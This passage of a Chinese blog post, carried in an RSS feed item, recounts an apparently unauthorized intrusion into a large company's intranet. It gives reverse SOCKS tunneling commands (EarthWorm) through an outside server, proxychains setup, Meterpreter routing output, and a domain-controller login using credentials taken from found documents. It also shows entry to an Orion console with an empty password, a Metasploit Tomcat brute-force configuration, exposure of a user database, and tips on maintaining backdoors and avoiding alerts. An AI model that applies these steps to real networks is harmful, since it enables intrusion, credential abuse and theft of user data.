PS &amp;gt; Invoke-Portscan -Hosts 10.159.63.5 -Ports &quot;22&quot;


Hostname      : 10.159.63.5
alive         : True
openPorts     : {22}
closedPorts   : {}
filteredPorts : {}
finishTime    : 2017/12/28 17:23:45
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x07-再一次克服困难&quot;&gt;0x07 再一次克服困难&lt;/h2&gt;

&lt;p&gt;之前的方案是使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Portfwd&lt;/code&gt;，但是效果太差了，当数据流过大，会将Meterpreter冲掉，并且每次数据回送都不完整。&lt;/p&gt;

&lt;p&gt;这次采用Socks5打洞，我利用了外网的服务器，开设一个Socks代理端口，将流量转发到目标内网&lt;/p&gt;

&lt;p&gt;外网服务器：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@iZm5e***1ga7bq07Z:~# ./ew_for_linux64 -s rcsocks -l 1080 -e 888 &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;内网主机：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ew_for_Win.exe -s rssocks -d [服务器IP] -e 888
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;ew下载地址： http://rootkiter.com/EarthWorm/&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;现在在浏览器中设置一下Socks5代理即可访问内网，很稳定&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x002.png&quot; alt=&quot;设置代理&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x001.png&quot; alt=&quot;打洞成功&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x08-开始扫描&quot;&gt;0x08 开始扫描&lt;/h2&gt;

&lt;p&gt;一开始我使用PowerSploit扫描，但是需要等待Meterpreter将数据取回，这样就占用了一个session，搜集了部分信息后，决定采用Nmap&lt;/p&gt;

&lt;p&gt;由于我的操作系统是黑苹果，需要安装proxychains-ng&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install proxychains-ng
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;程序安装在：&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/Cellar/proxychains-ng/4.12_1/bin/proxychains4&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;配置文件：&lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/etc/proxychains.conf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;添加一条Socks5代理：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#Examples:
#
#       socks5  192.168.67.78   1080    lamer   secret
#       http    192.168.89.3    8080    justu   hidden
#       socks4  192.168.1.49    1080
#       http    192.168.39.93   8080  
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to &quot;tor&quot;
socks5  ***.***.***.*** 1080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;开始扫描：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x003.png&quot; alt=&quot;扫描&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x09-信息搜集基本结果&quot;&gt;0x09 信息搜集基本结果&lt;/h2&gt;

&lt;p&gt;通过端口扫描以及HTTP服务的爬行，发现一些运维人员开放的共享，和一些MS17010漏洞的Windows服务器，但是没有选择直接去打，觉得信息搜集的不够全面&lt;/p&gt;

&lt;p&gt;在内网中收获最大的就是搜集到了运维人员用于共享系统镜像、工具的Web服务器：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x004.png&quot; alt=&quot;运维人员的服务器&quot; /&gt;&lt;/p&gt;

&lt;p&gt;发现基线检查的文档，下载了一两个，开始通过搜集的信息进行内网结构画像：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x006.png&quot; alt=&quot;基线检查&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x005.png&quot; alt=&quot;内网结构&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;轻松获得域控服务器&quot;&gt;轻松获得域控服务器&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x007.png&quot; alt=&quot;域控&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从文档中搜集信息如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;密码：*****@*****! *****

administrator密码：***** # 后面尝试了登录这个，不行
IP地址：10.159.16.2
掩码：255.255.255.128
网关：10.159.16.1
域名称：*****.com
域用户：***** 、 *****密码*****

计算机名：
所在域名或工作组名称：*****.com
IP地址：10.159.16.2
掩码：255.255.255.128
网关：10.159.16.1
操作系统：Windows Server2008 R2企业版
服务器1—群集节点A
计算机名：nascluster1
所在域名或工作组名称：*****.com
IP地址1：10.159.16.3
IP地址2：192.168.10.3
操作系统：Windows Server 2012
服务器2—群集节点B
计算机名：nascluster2
所在域名或工作组名称：*****.com
IP地址1：10.159.16.4
IP地址2：192.168.10.4
操作系统：Windows Server 2012

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;根据之前搜集的子网来判断，我们所处于的内网中有很多域。并且能够可以和域控服务器通信，即使当前的服务器不在域中，也可以进行登录&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x008.png&quot; alt=&quot;域控3389&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过两层转发，我们尝试登录：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一层是公司路由&lt;/li&gt;
  &lt;li&gt;一层是LCX&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x009.jpg&quot; alt=&quot;登录域控&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当时登录上去并没有做过多的操作，简单看看就下来了，因为这个内网很大，后面的发现令我倒吸凉气&lt;/p&gt;

&lt;h2 id=&quot;0x10-内网核心&quot;&gt;0x10 内网核心&lt;/h2&gt;

&lt;p&gt;Orion&lt;/p&gt;

&lt;p&gt;这是一款完善的网络带宽、性能和故障管理软件。使用它用户可以通过自己的浏览器即时监控自己的网络状态和统计资料。程序将监视和搜集来自路由、节点、服务器和所有开启SNMP服务的设备信息；同时也将监控本机的CPU占用率、内存使用情况以及可用磁盘空间。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0010.png&quot; alt=&quot;Orion&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过空口令进入&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0011.png&quot; alt=&quot;Orion&quot; /&gt;&lt;/p&gt;

&lt;p&gt;通过查看别名发现这些设备是企业的核心路由、防火墙、交换机&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;官网防火墙&lt;/li&gt;
  &lt;li&gt;管理员交换机（专线）&lt;/li&gt;
  &lt;li&gt;内网核心交换机 x 2&lt;/li&gt;
  &lt;li&gt;外网核心交换机 x 2&lt;/li&gt;
  &lt;li&gt;公网接入交换机 x 2&lt;/li&gt;
  &lt;li&gt;回源 （这个不太清楚）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;基本上都是50个口以上&lt;/p&gt;

&lt;p&gt;通过之前的自动搜集的路由来看：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] AutoAddRoute: Routing new subnet 10.0.0.0/255.0.0.0 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.0.0/255.255.128.0 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.63.128/255.255.255.128 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.128.0/255.255.128.0 through session 9
[*] AutoAddRoute: Routing new subnet 10.159.191.128/255.255.255.128 through session 9
[*] AutoAddRoute: Routing new subnet 169.254.0.0/255.255.0.0 through session 9
[*] AutoAddRoute: Routing new subnet 192.168.0.0/255.255.0.0 through session 9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;10.0.0.0 是可以访问整个超大的内网，在搜集其他网段信息的时候，不泛发现其他大企业的漏洞、大多是配置不得当。&lt;/p&gt;

&lt;h2 id=&quot;0x12-配置引发的隐患&quot;&gt;0x12 配置引发的隐患&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0012.png&quot; alt=&quot;一些配置文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0013.png&quot; alt=&quot;一些配置文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;还有未做权限验证的Docker集群管理平台：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0014.png&quot; alt=&quot;Docker&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有多个实例，分别用于对外的服务&lt;/p&gt;

&lt;p&gt;搜集到用户中心的数据库配置，也就是说泄漏了所有用户的数据了，这可是一个大厂。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0015.png&quot; alt=&quot;数据库&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其次一些网段基本上都安装了&lt;code class=&quot;highlighter-rouge&quot;&gt;tomcat&lt;/code&gt;，通过socks5代理，进行爆破，流量不走Meterpreter，因为会掉线&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf auxiliary(tomcat_mgr_login) &amp;gt; show options 

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                              Required  Description
   ----              ---------------                                                                              --------  -----------
   BLANK_PASSWORDS   false                                                                                        no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                                            yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                                        no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                                        no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                                        no        Add all users in the current database to the list
   PASSWORD                                                                                                       no        The HTTP password to specify for authentication
   PASS_FILE         /Volumes/OSXData/Pentester/Dict/100.txt                                                      no        File containing passwords, one per line
   Proxies           socks5:***.***.***.***:1080                                                                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.159.63.70-133                                                                             yes       The target address range or CIDR identifier
   RPORT             8080                                                                                         yes       The target port (TCP)
   SSL               false                                                                                        no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                                        yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                                yes       URI for Manager login. Default is /manager/html
   THREADS           10                                                                                           yes       The number of concurrent threads
   USERNAME                                                                                                       no        The HTTP username to specify for authentication
   USERPASS_FILE     /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                                        no        Try the username as the password for all users
   USER_FILE         /opt/metasploit-framework/embedded/framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                                         yes       Whether to print output for all attempts
   VHOST                                                                                                          no        HTTP server virtual host
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-04/0x0017.png&quot; alt=&quot;tomcat爆破&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如我所料，没有一个成功的，也发现了一些SSH端口，但是会把流量升高，触发一些警报，就没有再尝试这种爆破手法了。&lt;/p&gt;

&lt;h2 id=&quot;0x13-需要搜集的信息&quot;&gt;0x13 需要搜集的信息&lt;/h2&gt;

&lt;p&gt;搜集的信息列出来，就不贴了：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;服务器当前所在网段的所有主机端口&lt;/li&gt;
  &lt;li&gt;服务器ARP缓存&lt;/li&gt;
  &lt;li&gt;服务器上的服务&lt;/li&gt;
  &lt;li&gt;内网中其他HTTP服务&lt;/li&gt;
  &lt;li&gt;满足容易利用的漏洞端口 （MS17010 / 445）&lt;/li&gt;
  &lt;li&gt;抓包嗅探还是很有必要的  （千万不要ARP %@#@@651#@^#@@#@@###@@!）&lt;/li&gt;
  &lt;li&gt;共享文件&lt;/li&gt;
  &lt;li&gt;密码&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x14-总结&quot;&gt;0x14 总结&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;在行动之前思考几分钟，有没有更好的办法&lt;/li&gt;
  &lt;li&gt;思考一个问题多个解决方案的利弊&lt;/li&gt;
  &lt;li&gt;尽量快速熟悉网络环境 -&amp;gt; [前提是你已经熟悉了服务器环境]&lt;/li&gt;
  &lt;li&gt;对日志要时刻保持敏感&lt;/li&gt;
  &lt;li&gt;看子网掩码、计算子网大小，判断有没有VLAN&lt;/li&gt;
  &lt;li&gt;选取自己熟悉的协议进行信息搜集&lt;/li&gt;
  &lt;li&gt;网络命令一定要熟&lt;/li&gt;
  &lt;li&gt;对于后门要加强维护&lt;/li&gt;
  &lt;li&gt;你必须保证你花费98%的时间都在了解他们&lt;/li&gt;
  &lt;li&gt;学习使用Powershell和熟练掌握端口转发&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 28 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2017-12-28/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2017-12-28/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
  </channel>
</rss>
